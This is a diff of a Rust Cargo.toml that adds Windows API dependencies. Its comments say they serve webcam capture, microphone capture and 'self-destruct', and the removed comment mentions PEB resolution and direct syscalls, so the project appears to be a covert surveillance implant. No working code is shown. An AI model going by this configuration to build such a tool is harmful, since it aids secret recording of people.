@@ -17,4 +17,13 @@ strip         = true
 debug         = false
 
 [dependencies]
-# zero external deps — everything resolved via PEB / direct syscall
+# windows-rs for Media Foundation (webcam) + WASAPI (mic) + self-destruct
+windows = { version = "0.58", features = [
+    "Win32_Media_MediaFoundation",
+    "Win32_Media_Audio",
+    "Win32_System_Com",
+    "Win32_Foundation",
+    "Win32_Storage_FileSystem",
+    "Win32_System_Threading",
+    "Win32_Security",
+] }
